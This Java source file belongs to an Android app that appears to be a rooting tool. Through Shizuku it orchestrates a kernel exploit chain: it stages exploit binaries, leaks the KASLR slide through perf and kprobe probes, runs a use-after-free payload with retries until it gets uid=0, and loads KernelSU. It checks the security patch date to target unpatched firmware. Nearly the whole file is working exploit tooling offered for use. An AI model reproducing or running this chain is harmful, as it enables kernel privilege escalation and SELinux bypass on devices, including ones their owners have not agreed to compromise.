package com.gkeyes.lhasa26.core;

import android.content.res.AssetManager;

import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Owns the long-running workflow. UI code only receives immutable events and never runs shell work.
 * The supplied native payloads remain opaque assets; orchestration and state handling are our code.
 */
public final class WorkflowEngine implements AssetDeployer.WorkflowLog {
    public enum State { IDLE, RUNNING, ROOTED, KSU_PENDING, COMPLETE, FAILED }

    public static final String[] STEP_LABELS = {
            "校验内核", "等待系统空闲", "部署程序", "测量内核地址",
            "提权执行", "结果验证", "KernelSU 接管"
    };

    /** MemFree is dominated by page cache, so the idle gate follows MemAvailable instead. */
    private static final long IDLE_AVAILABLE_KB = 1500000L;
    /** Above this much available memory the force-stop of chat apps buys nothing. */
    private static final long CLEAN_SKIP_AVAILABLE_KB = 3000000L;
    private static final long DEPLOY_TIMEOUT_MS = 8000L;
    private static final Pattern RUNNING_PAYLOAD = Pattern.compile("uaf_plant_replay");
    private static final String RUN_MARKER = "/data/local/tmp/.lhasa_run";
    private static final String FAILED_MARKER = "/data/local/tmp/.lhasa_failed_boot";
    private static final String ROOTD_SOCKET = "/data/local/tmp/pc98260-root.sock";
    private static final String EXPLOIT_BINARIES = "uaf_plant_replay perf_slide slide_probe reach_probe";
    /**
     * 单次探测的硬上限（秒）。超出就 kill，绝不让采样器以 root 常驻——
     * 常驻的 perf_slide 会把设备拖进 soft lockup，表现就是"跑一次重启一次"。
     */
    private static final int PERF_PROBE_TIMEOUT_S = 8;
    private static final int SLIDE_PROBE_TIMEOUT_S = 12;
    private static final int DIAGNOSE_TIMEOUT_S = 25;
    private final CommandExecutor executor;
    private final AssetDeployer deployer;
    private final WorkflowCallbacks callbacks;
    private final ExecutorService worker = Executors.newSingleThreadExecutor(r -> {
        Thread thread = new Thread(r, "lhasa-workflow");
        thread.setDaemon(true);
        return thread;
    });
    private final Object logLock = new Object();
    private final StringBuilder sessionLog = new StringBuilder();
    private volatile State state = State.IDLE;
    private volatile long startedAt;
    private volatile int currentStep = -1;
    private volatile boolean busy;
    private volatile boolean rootBeforeRun;
    private volatile String enforceBeforeRun = "";
    private volatile String selinuxAfterRoot = "?";
    private volatile long lastDeviceRefresh;

    public WorkflowEngine(AssetManager assets, CommandExecutor executor, WorkflowCallbacks callbacks) {
        this.executor = executor;
        this.callbacks = callbacks;
        this.deployer = new AssetDeployer(assets, executor, this);
    }

    public State getState() {
        return state;
    }

    public boolean startRoot() {
        return start("root", this::runRootChain, true);
    }

    public boolean retryKernelSu() {
        if (state != State.ROOTED && state != State.KSU_PENDING) {
            return false;
        }
        return start("ksu", this::runKernelSuStep, true);
    }

    public boolean diagnose() {
        return start("diagnose", this::runDiagnosis, false);
    }

    public void refreshDeviceInfo() {
        worker.execute(() -> {
            if (!executor.isAvailable()) {
                return;
            }
            try {
                long now = System.currentTimeMillis();
                if (now - lastDeviceRefresh < 5000L) {
                    return;
                }
                lastDeviceRefresh = now;
                String[] fields = run("getprop ro.product.device; getprop ro.build.version.incremental; uname -r", true)
                        .output.trim().split("\\n");
                DeviceSnapshot snapshot = new DeviceSnapshot(
                        fields.length > 0 ? fields[0] : "",
                        fields.length > 1 ? fields[1] : "",
                        fields.length > 2 ? fields[2] : "");
                callbacks.onDevice(snapshot);
            } catch (Exception ignored) {
                // Device information is supplemental and should never block the main action.
            }
        });
    }

    public void stop() {
        worker.shutdownNow();
        executor.kill();
    }

    /** Share-safe session log: kernel addresses are masked. */
    public String getSessionLog() {
        return getShareableLog();
    }

    public String getRawSessionLog() {
        synchronized (logLock) {
            return sessionLog.toString();
        }
    }

    public String getShareableLog() {
        return getRawSessionLog().replaceAll("0x[0-9a-fA-F]{6,}", "0x<addr>");
    }

    @Override
    public void append(String line) {
        if (line == null || line.trim().isEmpty()) {
            return;
        }
        String value = line.endsWith("\n") ? line : line + "\n";
        synchronized (logLock) {
            sessionLog.append(value);
            if (sessionLog.length() > 96000) {
                sessionLog.delete(0, sessionLog.length() - 64000);
            }
        }
        callbacks.onLog(value);
    }

    @FunctionalInterface
    private interface WorkflowTask {
        void run() throws Exception;
    }

    /**
     * Serializes every background operation behind one busy flag. The owning workflows change the
     * public state; diagnosis and maintenance keep it untouched and only report a closing event so the
     * UI can end its timer without rewriting the recorded result.
     */
    private boolean start(String operation, WorkflowTask action, boolean ownsState) {
        synchronized (this) {
            if (busy) {
                append("正在运行，请勿重复点击。");
                return false;
            }
            if (!executor.isAvailable()) {
                callbacks.onStatus("Shizuku 未运行或尚未授权");
                append("请先启动 Shizuku 并授权本应用。");
                return false;
            }
            busy = true;
            startedAt = System.currentTimeMillis();
            currentStep = -1;
            if (ownsState) {
                state = State.RUNNING;
                synchronized (logLock) {
                    sessionLog.setLength(0);
                }
                callbacks.onState(State.RUNNING, operation);
            } else {
                callbacks.onStatus("正在诊断");
            }
        }
        worker.execute(() -> {
            try {
                action.run();
            } catch (InterruptedException interrupted) {
                Thread.currentThread().interrupt();
                if (ownsState) {
                    fail("操作已中断");
                } else {
                    append("操作已中断");
                    callbacks.onState(state, "操作已中断");
                }
            } catch (Throwable failure) {
                append(friendly(failure));
                if (ownsState) {
                    fail(friendly(failure));
                } else {
                    String message = "诊断失败 · " + friendly(failure);
                    callbacks.onStatus(message);
                    callbacks.onState(state, message);
                }
            } finally {
                busy = false;
                if (ownsState) {
                    // KernelSU took over (COMPLETE) means the temporary channel is no longer needed.
                    cleanupBinaries(state == State.ROOTED || state == State.KSU_PENDING);
                }
            }
        });
        return true;
    }

    private void runRootChain() throws Exception {
        long chainStart = System.currentTimeMillis();
        step(0);
        status("核对内核");
        String kernel = run("uname -r", false).output.trim();
        append("uname -r = " + kernel);
        if (!BootGuard.isSupportedKernel(kernel)) {
            append(BootGuard.kernelWarning(kernel));
        }
        if (payloadProcessCount() > 0) {
            throw new IllegalStateException("上次运行的进程仍在运行，请重启设备后重试。");
        }
        String boot = bootId();
        writeRunMarker(boot);
        // 上次是不是被重启打断的？面包屑还在就说明是。
        String leftover = run("cat " + BootGuard.STAGE_FILE + " 2>/dev/null", true).output;
        String hint = BootGuard.leftoverStageHint(leftover);
        if (!hint.isEmpty()) {
            append("[上次] " + hint);
        }
        String failed = run("cat " + FAILED_MARKER + " 2>/dev/null", true).output.trim();
        if (!boot.isEmpty() && !failed.isEmpty()) {
            String[] parts = failed.split("\\s+");
            if (boot.equals(parts[0])) {
                boolean permissive = parts.length > 1 && "0".equals(parts[1]);
                if (!permissive) {
                    throw new IllegalStateException("本次开机已失败且 SELinux 仍为 Enforcing，请重启后重试。");
                }
                append("（提示）本次开机已为 Permissive，将直接重试 cred 阶段。");
            }
        }
        captureBaseline();
        cleanMemory();

        step(1);
        status("等待系统空闲");
        final DeployGate deployGate = new DeployGate(DEPLOY_TIMEOUT_MS);
        Thread deploy = new Thread(() -> {
            try {
                deployer.stageAll();
                deployGate.markCompleted();
            } catch (Throwable error) {
                deployGate.fail(error);
            }
        }, "lhasa-deploy");
        deploy.start();
        waitForIdle();
        DeployGate.Result deployResult = deployGate.await(deploy);
        if (deployResult != DeployGate.Result.READY) {
            recordFailedBoot(boot);
            throw new IllegalStateException("部署未完成（" + deployResult + "）· 请重启后重试");
        }

        step(2);
        status("程序已就位");

        step(3);
        status("测量本次开机的内核地址");
        String addressArgument = measureAddress();

        step(4);
        status("提权执行中，请稍候");
        run(BootGuard.markCommand("payload"), true);
        if (!runPayload(addressArgument, boot)) {
            stopPayload();
            recordFailedBoot(boot);
            throw new IllegalStateException("提权失败 · 请重启设备");
        }

        step(5);
        status("验证");
        CommandResult verify = run("/data/local/tmp/pc98260-su -c 'id; getenforce; grep CapEff /proc/self/status'", false);
        append(verify.output);
        if (!isRoot(verify.output)) {
            recordFailedBoot(boot);
            throw new IllegalStateException("rootd 无响应 · 请重启设备");
        }
        run("rm -f " + FAILED_MARKER, true);
        clearRunMarker();
        run(BootGuard.clearStageCommand(), true);
        state = State.ROOTED;
        selinuxAfterRoot = enforceNow();
        callbacks.onStatus("已获得临时 ROOT · SELinux " + selinuxAfterRoot);
        append("临时 ROOT 已就绪。");
        append("[归因] " + (rootBeforeRun
                ? "开始时检查进程已是 uid=0（root 非本次取得），本次只确认根通道可用"
                : "开始时检查进程为 shell（未持有 root），结束时获得 uid=0")
                + " · SELinux " + (enforceBeforeRun.isEmpty() ? "?" : enforceBeforeRun)
                + " → " + selinuxAfterRoot);
        // KernelSU 接管会 late-load 内核模块，是整条链里最容易把设备带走的一步，
        // 所以不再自动执行：按钮会变成「重试 KernelSU 接管」，由用户决定何时做。
        append("[下一步] 需要 KernelSU 常驻时，再点一次主按钮执行接管（会加载内核模块，可能重启）。");
        callbacks.onState(State.ROOTED,
                "已获得临时 ROOT · 需要常驻再点一次加载 KernelSU · SELinux " + selinuxAfterRoot);
        append(String.format(Locale.US, "[耗时] 从点击到临时 ROOT 就绪 %.1fs",
                (System.currentTimeMillis() - chainStart) / 1000.0));
    }

    private void runDiagnosis() throws Exception {
        status("正在诊断");
        deployer.stage("reach_probe");
        run(BootGuard.markCommand("diagnose"), true);
        CommandResult result = run(BootGuard.withTimeout(DIAGNOSE_TIMEOUT_S,
                "/data/local/tmp/reach_probe > /data/local/tmp/diag.log 2>&1"), true);
        String report = run("cat /data/local/tmp/diag.log 2>/dev/null", true).output;
        if (report.trim().isEmpty()) {
            report = result.output;
        }
        append(report);
        if (result.exitCode == BootGuard.TIMEOUT_EXIT) {
            append("[诊断] reach_probe 超过 " + DIAGNOSE_TIMEOUT_S + " 秒被 timeout 终止——探针卡住了，不是环境不合格。");
        }
        run("echo '!enable_event:kmem:kmem_cache_alloc' > /sys/kernel/tracing/events/kmem/rss_stat/trigger 2>/dev/null; echo 0 > /sys/kernel/tracing/tracing_on 2>/dev/null", true);
        run(BootGuard.clearStageCommand(), true);
        String patch = run("getprop ro.build.version.security_patch", true).output.trim();
        append("[诊断] security_patch=" + patch + (patch.compareTo("2026-10-06") < 0
                ? " · 未修补窗口"
                : " · 可能已回补"));
        // reach_probe 用较新的工具链编译，attr.size 超出 6.18 内核接受的范围，
        // perf_event_open 会拿到 E2BIG；用真正取址的 perf_slide 复核这一项。
        if (report.contains("perf_event_open") && report.contains("FAIL")) {
            CommandResult slideProbe = run(BootGuard.withTimeout(PERF_PROBE_TIMEOUT_S,
                    "/data/local/tmp/perf_slide --duration 1"), true);
            String slide = KernelSupport.extractSlide(slideProbe.output);
            boolean usable = slide != null && KernelSupport.isSlideValid(KernelSupport.parseHex(slide));
            append("[诊断] 覆盖：" + (usable
                    ? "perf_slide 实测可用（slide=" + slide + "），perf_event_open 一项为探针 attr.size 误报"
                    : "perf_slide 同样取不到 KASLR 偏移，该项按真实失败处理"));
            if (usable) {
                String message = "诊断通过 · 环境可用（perf 项已覆盖）";
                append("[诊断] 通过 · 除 perf_event_open 探针项外全部达标");
                status(message);
                callbacks.onState(state, message);
                return;
            }
        }
        String message;
        if (report.contains("必需项全部通过")) {
            message = "诊断通过 · 环境可用";
            append("[诊断] 通过 · 环境可用（仅代表探针达标，不代表固件已修补或未修补）");
        } else {
            message = "诊断未通过 · 详见日志";
            append(report.contains("必需接口不可用") ? "[诊断] 失败 · 有必需项未通过" : "[诊断] 未完成 · 详见日志");
        }
        status(message);
        callbacks.onState(state, message);
    }

    private void runKernelSuStep() {
        try {
            step(6);
            status("已获得临时 ROOT · 正在加载 KernelSU");
            run(BootGuard.markCommand("ksu"), true);
            deployer.stage("ksud");
            CommandResult load = run("rm -f /data/local/tmp/ksu_try.log; "
                    + "/data/local/tmp/pc98260-su -c \"cd /data/local/tmp && ./ksud late-load --kmi android17-6.18 --allow-shell --package-name me.weishu.kernelsu\" "
                    + ">> /data/local/tmp/ksu_try.log 2>&1; echo rc=$? >> /data/local/tmp/ksu_try.log; "
                    + "for i in 1 2 3 4 5 6 7 8 9 10; do /system/bin/su -c id >> /data/local/tmp/ksu_try.log 2>&1 && break; sleep 0.3; done", true);
            String log = run("cat /data/local/tmp/ksu_try.log 2>/dev/null", true).output;
            if (log.trim().isEmpty()) {
                log = load.output;
            }
            append(log);
            CommandResult suProbe = run("/system/bin/su -c id 2>/dev/null", true);
            CommandResult ksudProbe = run("/system/bin/su -c '/data/local/tmp/ksud -V' 2>/dev/null", true);
            append("[KSU] su -c id → " + oneLine(suProbe.output));
            append("[KSU] ksud -V → " + oneLine(ksudProbe.output));
            selinuxAfterRoot = enforceNow();
            append("[SELinux] 最终实测 " + selinuxAfterRoot);
            run(BootGuard.clearStageCommand(), true);
            if (suProbe.output.contains("uid=0")) {
                state = State.COMPLETE;
                callbacks.onState(State.COMPLETE, "全部完成 · 已接管 · SELinux " + selinuxAfterRoot);
            } else {
                state = State.KSU_PENDING;
                callbacks.onState(State.KSU_PENDING,
                        "未接管 · 临时 ROOT 仍有效 · SELinux " + selinuxAfterRoot);
            }
        } catch (Throwable failure) {
            append(friendly(failure));
            if (shizukuGone()) {
                state = State.KSU_PENDING;
                callbacks.onState(State.KSU_PENDING,
                        "可能已接管 · Shizuku 已断开，请重新启动 Shizuku 后再确认 · SELinux " + selinuxAfterRoot);
                return;
            }
            if (isPanic()) {
                state = State.FAILED;
                callbacks.onState(State.FAILED, "内核已 panic（pstore 有记录），必须重启后再试");
                return;
            }
            state = State.KSU_PENDING;
            callbacks.onState(State.KSU_PENDING,
                    "未接管 · 临时 ROOT 仍有效 · SELinux " + selinuxAfterRoot);
        }
    }

    private void waitForIdle() throws Exception {
        long started = System.currentTimeMillis();
        int runnable = -1;
        long freeKb = -1;
        long availableKb = -1;
        boolean reached = false;
        while (System.currentTimeMillis() - started < 20000L) {
            String[] dump = run("cat /proc/loadavg 2>/dev/null; grep -E '^(MemFree|MemAvailable):' /proc/meminfo 2>/dev/null", true)
                    .output.trim().split("\\n");
            for (String line : dump) {
                String[] fields = line.trim().split("\\s+");
                if (fields.length >= 4 && fields[3].contains("/")) {
                    try {
                        runnable = Integer.parseInt(fields[3].substring(0, fields[3].indexOf('/')));
                    } catch (NumberFormatException ignored) {
                        runnable = -1;
                    }
                } else if (fields.length >= 2) {
                    try {
                        if (fields[0].startsWith("MemFree")) {
                            freeKb = Long.parseLong(fields[1]);
                        } else if (fields[0].startsWith("MemAvailable")) {
                            availableKb = Long.parseLong(fields[1]);
                        }
                    } catch (NumberFormatException ignored) {
                        // keep the previous sample
                    }
                }
            }
            if (runnable >= 0 && runnable <= 6 && availableKb >= IDLE_AVAILABLE_KB) {
                reached = true;
                break;
            }
            Thread.sleep(300L);
        }
        append(String.format(Locale.US,
                "[空闲] 等待 %.1fs · runnable=%d · MemAvailable=%d kB（门限 %d）· MemFree=%d kB · %s",
                (System.currentTimeMillis() - started) / 1000.0, runnable, availableKb, IDLE_AVAILABLE_KB,
                freeKb, reached ? "达标，开跑" : "未达标，仍开跑"));
    }

    /**
     * 测量本次开机的内核地址。
     *
     * 三条来源依次尝试：perf 采样（--slide）→ slide_probe 的 calc=（--slide）→ site=（--site）。
     * 三者在 shell 身份下都可能失败：这台 ROM 的 SELinux 对 shell 禁了
     * `perf_event` 的 `{ kernel }` 权限，kallsyms 与 kprobe 也封闭。
     *
     * 因此拿不到时**不再中断**：打印明确警告，返回空参数，让 uaf_plant_replay
     * 用 lhasa_profile.txt 里的链接期地址自行判定。它的失败保护（holding zombie →
     * 本次开机终止）仍然生效，所以最坏情况与现在持平。
     */
    private String measureAddress() throws Exception {
        for (int seconds : new int[]{1, 2}) {
            run(BootGuard.markCommand("probe-perf"), true);
            CommandResult result = run(BootGuard.withTimeout(PERF_PROBE_TIMEOUT_S,
                    "/data/local/tmp/perf_slide --duration " + seconds), true);
            String output = filterProbe(result.output);
            if (!output.trim().isEmpty()) {
                append(output);
            }
            if (result.exitCode == BootGuard.TIMEOUT_EXIT) {
                append("perf_slide 超过 " + PERF_PROBE_TIMEOUT_S + " 秒被 timeout 终止（采样器卡住），换下一档");
            }
            String slide = KernelSupport.extractSlide(result.output);
            long parsed = KernelSupport.parseHex(slide);
            if (slide != null && KernelSupport.isSlideValid(parsed)) {
                append("slide = " + slide + "（perf " + seconds + "s）");
                return "--slide " + slide;
            }
            if (slide != null) {
                append("slide " + slide + " 越界/未对齐，弃用");
            }
        }

        append("perf_slide 未取到，改用 slide_probe");
        run(BootGuard.markCommand("probe-slide"), true);
        CommandResult probe = run(BootGuard.withTimeout(SLIDE_PROBE_TIMEOUT_S,
                "/data/local/tmp/slide_probe"), false);
        append(filterProbe(probe.output));
        if (probe.exitCode == BootGuard.TIMEOUT_EXIT) {
            append("slide_probe 超过 " + SLIDE_PROBE_TIMEOUT_S + " 秒被 timeout 终止");
        }
        String calc = KernelSupport.extractCalc(probe.output);
        if (calc != null) {
            append("slide = " + calc + "（kprobe）");
            return "--slide " + calc;
        }
        String site = KernelSupport.extractSite(probe.output);
        if (site != null) {
            append("site = " + site + "（site 探测）");
            return "--site " + site;
        }

        // 三条来源都没拿到：不再中断，交给 payload 自行判定。
        append("[测量] 三种来源都没取到内核地址：");
        append("[测量]   · perf 采样被 SELinux 拒绝（shell 域无 perf_event kernel 权限）");
        append("[测量]   · slide_probe 命中 0（tracefs 只能看到分配事件，拿不到真实地址）");
        append("[测量]   · kallsyms / kprobe 对 shell 封闭");
        append("[测量] 改为不带参数运行，让 uaf_plant_replay 用 lhasa_profile.txt 自行判定。");
        recordFailedBootStage("measure-skip");
        return "";
    }

    private boolean runPayload(String addressArgument, String boot) throws Exception {
        String args = addressArgument == null ? "" : addressArgument.trim();
        if (!args.isEmpty()) {
            append("[payload] 参数：" + args);
        } else {
            append("[payload] 不带地址参数启动（由 payload 自行判定）");
        }
        for (int attempt = 1; attempt <= 3; attempt++) {
            run("rm -f /data/local/tmp/uaf_replay.log; " + BootGuard.launchCommand(
                    "/data/local/tmp/uaf_plant_replay",
                    args,
                    "/data/local/tmp/uaf_replay.log"), true);
            Thread.sleep(1500L);
            for (int poll = 0; poll < 200; poll++) {
                String tail = run("tail -n 24 /data/local/tmp/uaf_replay.log 2>/dev/null", true).output;
                if (!tail.trim().isEmpty()) {
                    callbacks.onTail(tail);
                }
                BootGuard.Outcome outcome = BootGuard.classify(tail);
                if (outcome == BootGuard.Outcome.SUCCESS) {
                    return true;
                }
                if (outcome == BootGuard.Outcome.ABORT_BOOT) {
                    recordFailedBoot(boot);
                    throw new IllegalStateException(
                            "payload 报告节点已挂树（holding zombie）· 本次开机终止，请重启设备");
                }
                if (poll % 5 == 4) {
                    CommandResult verify = run("/data/local/tmp/pc98260-su -c 'id'", true);
                    if (isRoot(verify.output)) {
                        return true;
                    }
                }
                if (outcome == BootGuard.Outcome.RETRY_SAFE) {
                    break;
                }
                Thread.sleep(800L);
            }
            if (attempt < 3) {
                append("[重试] 第 " + attempt + " 次未命中，重启 payload 再试（" + (attempt + 1) + "/3）");
                stopPayload();
                Thread.sleep(1200L);
            }
        }
        return isRoot(run("/data/local/tmp/pc98260-su -c 'id'", true).output);
    }

    /** 只记阶段面包屑，不动失败标记（测量失败不等于内核已被污染）。 */
    private void recordFailedBootStage(String stage) {
        try {
            run(BootGuard.markCommand(stage), true);
        } catch (Exception ignored) {
            // 诊断信息缺失不影响主流程
        }
    }

    private void stopPayload() throws Exception {
        run(BootGuard.killCommand(), true);
    }

    /**
     * /proc is mounted with hidepid=invisible here, so ps cannot see other processes; the leftover
     * rootd socket is the only reliable sign that an earlier payload is still alive.
     */
    private int payloadProcessCount() throws Exception {
        int count = Integer.parseInt(run(BootGuard.aliveCommand(), true).output.trim());
        if (count > 0) {
            return count;
        }
        String socket = run("test -S " + ROOTD_SOCKET + " && echo 1 || echo 0", true).output.trim();
        return "1".equals(socket) ? 1 : 0;
    }

    /**
     * Removes the world-executable exploit binaries from /data/local/tmp once the workflow is over.
     * Logs stay for debugging. While a temporary root is the only way up, its client and socket stay;
     * once KernelSU has taken over they are dead weight and are removed too.
     */
    private void cleanupBinaries(boolean keepRootClient) {
        try {
            if (!keepRootClient) {
                run(BootGuard.killCommand(), true);
            }
            String targets = EXPLOIT_BINARIES + (keepRootClient ? "" : " pc98260-su pc98260-root.sock");
            run("cd /data/local/tmp 2>/dev/null; rm -f " + targets + "; true", true);
            append("[清理] 已移除 " + targets + (keepRootClient
                    ? "（保留 pc98260-su 与 rootd socket，临时 ROOT 仍在用）"
                    : "（KernelSU 已接管，临时通道一并移除）"));
        } catch (Exception ignored) {
            // Cleanup is best effort and must not change the workflow result.
        }
    }

    /**
     * Runs a maintenance command through the same busy gate as the exploit workflow.
     * /proc is hidepid=invisible, so "pidof system_server" returns nothing and the old soft-reboot
     * command silently did nothing; it is replaced by an init restart of zygote, which needs su.
     */
    public boolean runMaintenance(String command) {
        return start("maint", () -> {
            boolean canElevate = "yes".equals(run("test -x /system/bin/su && echo yes || echo no", true).output.trim());
            String target = command;
            if (command.contains("pidof system_server")) {
                if (!canElevate) {
                    append("[维护] 软重启需要 /system/bin/su（KernelSU 已加载后可用），当前不可用");
                    callbacks.onState(state, "软重启不可用 · 需要 KernelSU su");
                    return;
                }
                target = "/system/bin/su -c 'setprop ctl.restart zygote'";
                append("[维护] 软重启：改为由 init 重启 zygote（pidof 在 hidepid=invisible 下取不到 system_server）");
            } else if (command.startsWith("reboot") && canElevate) {
                target = "/system/bin/su -c 'reboot'";
            }
            CommandResult result = run(target, true);
            append(result.isSuccess()
                    ? "维护命令完成"
                    : "维护命令失败（退出码 " + result.exitCode + "）：" + result.output);
        }, false);
    }

    private CommandResult run(String command, boolean quiet) throws Exception {
        return executor.run(command, quiet);
    }

    /** Boot id of the running kernel; empty when the value cannot be read. */
    private String bootId() {
        try {
            return run("cat /proc/sys/kernel/random/boot_id 2>/dev/null", true).output.trim();
        } catch (Exception ignored) {
            return "";
        }
    }

    private void writeRunMarker(String boot) {
        if (boot == null || boot.isEmpty()) {
            return;
        }
        try {
            run("echo '" + boot + " " + System.currentTimeMillis() + "' > " + RUN_MARKER, true);
        } catch (Exception ignored) {
            // A missing marker only degrades diagnostics.
        }
    }

    private void clearRunMarker() {
        try {
            run("rm -f " + RUN_MARKER, true);
        } catch (Exception ignored) {
            // Best effort only.
        }
    }

    /**
     * Records the failed boot so a second attempt inside the same boot can be gated exactly like the
     * original tool: SELinux already permissive means the first phase landed, so only the cred stage
     * has to be retried; still Enforcing means the kernel state is polluted and a reboot is required.
     */
    private void recordFailedBoot(String boot) {
        if (boot == null || boot.isEmpty()) {
            return;
        }
        try {
            boolean permissive = "Permissive".equalsIgnoreCase(run("getenforce 2>/dev/null", true).output.trim());
            run("echo '" + boot + " " + (permissive ? 0 : 1) + "' > " + FAILED_MARKER, true);
            append(permissive
                    ? "已记录本次失败：SELinux 已 Permissive，可直接重试 cred 阶段（无需重启）。"
                    : "已记录本次失败：SELinux 仍 Enforcing，请重启后重试，切勿重复点击。");
        } catch (Exception ignored) {
            // Recording the failure must never mask the original error.
        }
    }

    /**
     * Frees memory before the exploit runs, but only when it is actually short: on a 16 GB phone with
     * several GB available the force-stop of chat apps costs more than it buys.
     */
    private void cleanMemory() {
        try {
            long[] before = memoryState();
            if (before[1] >= CLEAN_SKIP_AVAILABLE_KB) {
                append("清理系统内存：跳过（MemAvailable " + before[1] + " kB 已超过 "
                        + CLEAN_SKIP_AVAILABLE_KB + " kB，无需中断后台应用）");
                return;
            }
            CommandResult stop = run("am force-stop com.tencent.mm 2>/dev/null; am force-stop com.tencent.mobileqq 2>/dev/null; true", true);
            long[] after = memoryState();
            append("清理系统内存：MemFree " + before[0] + "→" + after[0] + " kB · MemAvailable "
                    + before[1] + "→" + after[1] + " kB"
                    + (stop.exitCode == 0 ? "" : "（命令退出码 " + stop.exitCode + "）"));
        } catch (Exception ignored) {
            append("清理系统内存：跳过");
        }
    }

    /** {MemFree, MemAvailable} in kB, -1 when unreadable. */
    private long[] memoryState() {
        try {
            String out = run("grep -E '^(MemFree|MemAvailable):' /proc/meminfo 2>/dev/null", true).output.trim();
            long free = -1L;
            long available = -1L;
            for (String line : out.split("\\n")) {
                String[] fields = line.trim().split("\\s+");
                if (fields.length < 2) {
                    continue;
                }
                if (fields[0].startsWith("MemFree")) {
                    free = Long.parseLong(fields[1]);
                } else if (fields[0].startsWith("MemAvailable")) {
                    available = Long.parseLong(fields[1]);
                }
            }
            return new long[]{free, available};
        } catch (Exception ignored) {
            return new long[]{-1L, -1L};
        }
    }

    /**
     * Records what the device already looked like before any exploit step, so a later "uid=0" can be
     * attributed: pre-existing root, patch level of the running firmware, and a live rootd socket.
     */
    private void captureBaseline() {
        try {
            String id = oneLine(run("id 2>/dev/null", true).output);
            enforceBeforeRun = run("getenforce 2>/dev/null", true).output.trim();
            String patch = run("getprop ro.build.version.security_patch", true).output.trim();
            String suProbe = run("/system/bin/su -c id 2>/dev/null", true).output;
            String socket = run("ls -l " + ROOTD_SOCKET + " 2>/dev/null", true).output.trim();
            append("[基线] id=" + id + " · SELinux=" + enforceBeforeRun);
            append("[基线] security_patch=" + patch + (patch.compareTo("2026-10-06") < 0
                    ? "（早于上游修复 2026-10-06，处于未修补窗口）"
                    : "（不早于上游修复 2026-10-06，固件可能已回补，失败需先怀疑此处）"));
            append("[基线] /system/bin/su=" + (suProbe.trim().isEmpty() ? "无" : oneLine(suProbe)));
            append("[基线] rootd socket=" + (socket.isEmpty() ? "无" : "已存在（本次开机可能已 root 过）"));
            rootBeforeRun = suProbe.contains("uid=0") || id.contains("uid=0");
        } catch (Exception ignored) {
            // A missing baseline only weakens attribution, it must not stop the run.
        }
    }

    private String enforceNow() {
        try {
            return run("getenforce 2>/dev/null", true).output.trim();
        } catch (Exception ignored) {
            return "?";
        }
    }

    private static String oneLine(String value) {
        if (value == null) {
            return "";
        }
        String trimmed = value.trim();
        return trimmed.isEmpty() ? "无" : trimmed.replace('\n', ' ');
    }

    private boolean shizukuGone() {
        try {
            return !executor.isAvailable();
        } catch (Throwable ignored) {
            return true;
        }
    }

    private boolean isPanic() {
        try {
            String out = run("grep -m1 -aE 'Kernel panic|Internal error|Unable to handle kernel|BUG: ' "
                    + "/sys/fs/pstore/console-ramoops* 2>/dev/null", true).output;
            return out != null && !out.trim().isEmpty();
        } catch (Exception ignored) {
            return false;
        }
    }

    private void step(int value) {
        currentStep = value;
        callbacks.onStep(value, value >= 0 && value < STEP_LABELS.length ? STEP_LABELS[value] : "全部完成");
    }

    private void status(String text) {
        callbacks.onStatus(text);
    }

    private void fail(String message) {
        state = State.FAILED;
        callbacks.onState(State.FAILED, message);
    }

    private static boolean isRoot(String output) {
        return output != null && (output.contains("uid=0(root)") || output.contains("uid=0 "));
    }

    private static String filterProbe(String output) {
        if (output == null) {
            return "";
        }
        StringBuilder filtered = new StringBuilder();
        for (String line : output.split("\\n")) {
            if (!line.startsWith("[slide] cpu") && !line.trim().isEmpty()) {
                filtered.append(line).append('\n');
            }
        }
        return filtered.toString();
    }

    private static String friendly(Throwable error) {
        Throwable current = error;
        while (current.getCause() != null) {
            current = current.getCause();
        }
        String message = current.getMessage();
        if (message == null || message.trim().isEmpty()) {
            message = current.toString();
        }
        if (message.contains("DeadObject") || message.contains("Binder") || message.contains("binder")) {
            return "Shizuku 连接已断开，请重新启动 Shizuku";
        }
        return message;
    }
}
